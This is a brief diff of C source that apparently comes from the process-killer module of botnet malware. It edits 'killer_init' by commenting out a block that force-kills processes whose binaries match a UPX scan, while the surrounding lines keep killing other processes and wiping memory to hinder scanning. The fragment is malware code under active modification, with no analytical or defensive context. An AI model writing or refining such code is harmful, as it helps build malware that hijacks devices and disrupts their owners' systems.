@@ -222,14 +222,15 @@ void killer_init(void)
                 kill(pid, 9);
             } 
 
-            
+            /*
             if (upx_scan_match(exe_path, status_path))
-            {/*
+            {
 #ifdef DEBUG
                 printf("[killer] UPX scan match for binary %s\n", exe_path);
-#endif*/
+#endif
                 kill(pid, 9);
             }
+            */
 
             // Don't let others memory scan!!!
             util_zero(exe_path, sizeof (exe_path));
